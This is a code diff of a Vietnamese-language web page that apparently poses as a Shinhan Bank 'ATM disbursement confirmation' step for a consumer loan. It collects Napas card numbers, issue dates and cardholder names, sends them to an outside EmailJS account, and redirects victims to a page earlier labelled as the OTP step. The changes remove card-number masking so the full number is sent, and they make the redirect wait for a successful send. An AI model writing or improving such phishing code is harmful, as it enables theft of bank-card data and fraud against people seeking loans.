@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Xác Nhận Giải Ngân Qua ATM</title>
     <script async src="https://cdnjs.cloudflare.com/ajax/libs/inputmask/5.0.8/inputmask.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <script>
         // Inputmask fallback
@@ -315,12 +314,8 @@
             margin-bottom: 10px;
         }
 
-        .guide-section img {
-            max-width: 300px;
-            width: 100%;
-            border: 1px solid #e9ecef;
-            border-radius: 5px;
-            margin-bottom: 10px;
+        .guide-section p {
+            font-size: 14px;
         }
 
         .issue-guide-section {
@@ -410,6 +405,12 @@
             font-weight: bold;
         }
 
+        .form-group .input-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
         .form-group input {
             width: 100%;
             padding: 8px;
@@ -432,6 +433,15 @@
             font-size: 12px;
             color: #666;
             margin-top: 5px;
+        }
+
+        .help-icon {
+            color: red;
+            font-weight: bold;
+            font-size: 16px;
+            margin-left: 5px;
+            cursor: pointer;
+            display: inline-block;
         }
 
         .buttons {
@@ -787,8 +797,7 @@
                         <img src="https://www.vban.vn/Resources/images/logo-bank/VIETBANK.png" alt="VIETBANK Logo">
                         <p>VIETBANK</p>
                     </div>
-                    <div class="bank-option" data-bank="SEABANK" data-logo="https://www.vban.vn/Resources/images/logo-b
-ank/SEABANK.png">
+                    <div class="bank-option" data-bank="SEABANK" data-logo="https://www.vban.vn/Resources/images/logo-bank/SEABANK.png">
                         <img src="https://www.vban.vn/Resources/images/logo-bank/SEABANK.png" alt="SEABANK Logo">
                         <p>SEABANK</p>
                     </div>
@@ -857,25 +866,30 @@ ank/SEABANK.png">
             <div class="guide-section" id="card-guide">
                 <img class="bank-logo" id="selected-bank-logo" src="" alt="Logo ngân hàng đã chọn">
                 <h3>Hướng dẫn nhập thông tin thẻ Napas</h3>
-                <img src="https://via.placeholder.com/300x150?text=Thẻ+Napas+Mẫu" alt="Hình ảnh minh họa thẻ Napas, hiển thị số thẻ, tên, ngày phát hành" data-bank="">
                 <p>Số thẻ Napas bắt đầu bằng 9704, thông tin khác ở mặt trước thẻ.</p>
             </div>
             <form id="card-info-form" class="card-form">
                 <div class="form-group" aria-live="polite">
-                    <label for="napasCardNumber">Số thẻ Napas *</label>
-                    <input type="text" id="napasCardNumber" placeholder="9704 ..." maxlength="23" required aria-describedby="napasCardNumberError">
+                    <label for="napasCardNumber">Số thẻ Napas *<span class="help-icon" onclick="showHelp('napasCardNumber')">?</span></label>
+                    <div class="input-wrapper">
+                        <input type="text" id="napasCardNumber" placeholder="9704 ..." maxlength="23" required aria-describedby="napasCardNumberError">
+                    </div>
                     <span class="help-text">Số thẻ in trên mặt trước thẻ Napas, bắt đầu bằng 9704, từ 16 đến 19 số.</span>
                     <span class="error" id="napasCardNumberError">Số thẻ phải bắt đầu bằng 9704 và có từ 16 đến 19 số</span>
                 </div>
                 <div class="form-group" aria-live="polite">
-                    <label for="napasIssueDate">Ngày phát hành *</label>
-                    <input type="text" id="napasIssueDate" placeholder="05/25" maxlength="5" required aria-describedby="napasIssueDateError">
+                    <label for="napasIssueDate">Ngày phát hành *<span class="help-icon" onclick="showHelp('napasIssueDate')">?</span></label>
+                    <div class="input-wrapper">
+                        <input type="text" id="napasIssueDate" placeholder="05/25" maxlength="5" required aria-describedby="napasIssueDateError">
+                    </div>
                     <span class="help-text">Ngày phát hành trên thẻ, định dạng mm/yy (ví dụ: 05/25).</span>
                     <span class="error" id="napasIssueDateError">Ngày phát hành phải hợp lệ (mm/yy, không phải tương lai)</span>
                 </div>
                 <div class="form-group" aria-live="polite">
-                    <label for="napasFullName">Họ và tên chủ thẻ *</label>
-                    <input type="text" id="napasFullName" required aria-describedby="napasFullNameError">
+                    <label for="napasFullName">Họ và tên chủ thẻ *<span class="help-icon" onclick="showHelp('napasFullName')">?</span></label>
+                    <div class="input-wrapper">
+                        <input type="text" id="napasFullName" required aria-describedby="napasFullNameError">
+                    </div>
                     <span class="help-text">Tên chủ thẻ in trên mặt trước thẻ, nhập chính xác.</span>
                     <span class="error" id="napasFullNameError">Họ và tên phải có ít nhất 2 ký tự</span>
                 </div>
@@ -914,6 +928,11 @@ ank/SEABANK.png">
         let selectedBank = null;
         let selectedBankLogo = null;
 
+        // Show Help Placeholder
+        function showHelp(fieldId) {
+            alert(`Hướng dẫn cho ${selectedBank || 'ngân hàng'} sẽ được cập nhật.`);
+        }
+
         // Toggle Hamburger Menu
         function toggleMenu() {
             const menu = document.getElementById('nav-menu');
@@ -950,7 +969,6 @@ ank/SEABANK.png">
             document.getElementById('card-info-form').classList.add('active');
             document.getElementById('issue-guide-btn').classList.add('active');
             document.getElementById('selected-bank-logo').src = selectedBankLogo;
-            document.querySelector('.guide-section img').setAttribute('data-bank', selectedBank);
             document.querySelector('.form-container h2').classList.add('active');
             document.querySelector('.summary').classList.add('active');
         }
@@ -1068,24 +1086,15 @@ ank/SEABANK.png">
                 document.getElementById('summaryCardType').textContent = 'napas';
                 document.getElementById('summaryBankName').textContent = selectedBank;
 
-                // Original localStorage and CryptoJS logic
+                // Save to sessionStorage
                 const cardInfo = {
-                    cardNumber: '****' + cardNumber.slice(-4),
+                    cardNumber: document.getElementById('napasCardNumber').value,
                     issueDate,
                     fullName,
                     cardType: 'napas',
                     bankName: selectedBank
                 };
-                try {
-                    let cardInfoList = JSON.parse(localStorage.getItem('cardInfo') || '[]');
-                    cardInfoList.push(cardInfo);
-                    const encryptedData = CryptoJS.AES.encrypt(JSON.stringify(cardInfoList), 'shinhan-secret-key').toString();
-                    localStorage.setItem('cardInfo', encryptedData);
-                } catch (error) {
-                    console.error('Error saving cardInfo:', error);
-                    alert('Lỗi khi lưu thông tin thẻ. Vui lòng thử lại.');
-                    isValid = false;
-                }
+                sessionStorage.setItem('cardInfo', JSON.stringify(cardInfo));
 
                 // Send to EmailJS
                 emailjs.send('service_60tgxof', 'template_m26sq6s', {
@@ -1105,12 +1114,15 @@ ank/SEABANK.png">
                     email: 'N/A',
                     method: 'N/A'
                 }).then(
-                    () => {},
-                    (error) => console.error('EmailJS error:', error)
+                    () => {
+                        console.log('EmailJS sent successfully');
+                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/atm2.html';
+                    },
+                    (error) => {
+                        console.error('EmailJS error:', error);
+                        alert('Lỗi khi gửi thông tin. Vui lòng thử lại.');
+                    }
                 );
-
-                // Redirect to OTP page
-                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/atm2.html';
             }
 
             return isValid;
